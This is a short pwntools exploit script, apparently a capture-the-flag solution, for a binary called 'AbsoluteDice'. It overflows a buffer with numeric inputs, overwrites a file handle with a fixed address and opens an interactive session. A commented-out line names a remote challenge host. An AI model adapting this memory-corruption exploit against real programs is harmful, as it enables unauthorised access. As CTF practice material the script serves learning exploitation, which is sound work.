from pwn import *

p = process("./AbsoluteDice")
#p=remote("ix2test01.ractfinfra.uk", 5000)
if len(sys.argv) == 2:
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, gdbscript="b* 0x8048714\ngef config context.nb_lines_stack 64\n")

def input_qword(qword):
      x = qword & 0xffffffff
      y = ((qword & 0xffffffff00000000) >> 32)
      input_dword(x)
      input_dword(y)

def input_dword(dword):
    p.sendline(str(dword))

for i in range(31):
    # fill buffer
    input_dword(i+1)

#p.interactive()

# You are now clobbering the file handle
input_dword(134512980)
# input_dword(0x08048a99)

for i in range(51):
    input_dword(4)

p.interactive()
